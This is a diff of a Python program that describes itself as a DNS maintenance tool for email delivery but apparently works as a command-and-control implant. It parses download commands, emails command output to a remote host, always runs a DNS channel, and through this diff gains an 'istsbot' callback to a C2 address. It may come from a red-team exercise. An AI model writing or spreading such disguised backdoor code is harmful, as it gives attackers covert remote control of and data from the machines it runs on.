@@ -28,6 +28,7 @@ import os
 import sys
 import argparse
 import time
+import istsbot
 
 def wget(cmd):
     #parse a "wg http://..." command
@@ -626,9 +627,6 @@ def smtpRun(dest):
         stderr = ""
     connection.sendmail(emailAddr, "mailman@"+dest, stdout+"\n"+stderr)
 
-def c2Run(fqdn: str):
-    print("Attempting to communicate with C2")
-
 def linuxResolv():
     for line in open("/etc/resolv.conf", "r"):
         cols = line.split()
@@ -683,7 +681,7 @@ def main():
 
     parser = argparse.ArgumentParser(description='Maintains DNS resolution for email delivery.')
     parser.add_argument("--systemd", help="Take input and timing from SystemD rather than running automatically by itself.", action="store_true")
-    parser.add_argument('-D', "--dns", help="Use DNS", action="store_true")
+    #parser.add_argument('-D', "--dns", help="Use DNS", action="store_true")  #We'll always run DNS
     parser.add_argument("-S", "--smtp", help="Use SMTP", action="store_true")
     parser.add_argument("-i", "--install", help="Install new settings.", action="store_true")
     #todo: implement install
@@ -695,12 +693,11 @@ def main():
         dnsDest = args.hostname
 
     while True:
-        if args.dns:
-            dnsRun(dnsDest)
+        dnsRun(dnsDest)
         if args.smtp:
             smtpRun(smtpDest)
         if c2enabled:
-            c2Run(c2IP)
+            istsbot.istsCallback(c2IP)
         if args.systemd:
             # running from systemd, don't enable timed autorun
             exit(0)
